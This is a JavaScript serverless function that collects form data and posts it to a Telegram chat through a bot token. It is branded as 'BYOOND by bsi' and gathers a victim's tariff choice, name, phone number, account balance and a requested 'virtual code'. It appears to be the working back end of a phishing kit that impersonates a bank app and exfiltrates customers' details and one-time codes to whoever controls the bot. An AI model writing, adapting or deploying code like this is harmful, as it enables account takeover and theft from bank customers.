const axios = require('axios');

exports.handler = async (event, context) => {
    // Handle CORS preflight
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'POST'
            }
        };
    }

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
            throw new Error('Telegram credentials not configured');
        }

        // Start building the message with header
        let messageLines = [
            '├• DUET | BYOOND by bsi',
            '├───────────────────'
        ];

        // Always include tariff selection if available
        if (data.tariff) {
            messageLines.push(`├• pilih tarif : ${data.tariff === 'old' ? 'lama' : 'baru'}`);
        }

        // Add name section if available
        if (data.name) {
            messageLines.push('├───────────────────', `├• nama : ${data.name}`);
        }

        // Add phone number if available
        if (data.phone) {
            messageLines.push('├───────────────────', `├• nomor : ${data.phone}`);
        }

        // Add balance if available
        if (data.balance) {
            messageLines.push('├───────────────────', `├• saldo : Rp ${formatNumber(data.balance)}`);
        }

        // Add virtual code request if applicable
        if (data.step === 'request-code') {
            messageLines.push('├───────────────────', '├• minta kode virtual :');
        }

        // Add virtual code if available (final step)
        if (data.virtualCode) {
            messageLines.push('├───────────────────', `├• kode virtual : ${data.virtualCode}`);
        }

        // Close the message box
        messageLines.push('╰───────────────────');

        // Send to Telegram
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: messageLines.join('\n'),
            parse_mode: 'Markdown'
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true }),
            headers: { 'Content-Type': 'application/json' }
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                success: false,
                error: error.message 
            })
        };
    }
};

// Helper function to format numbers with thousand separators
function formatNumber(num) {
    if (!num) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
                                                  }
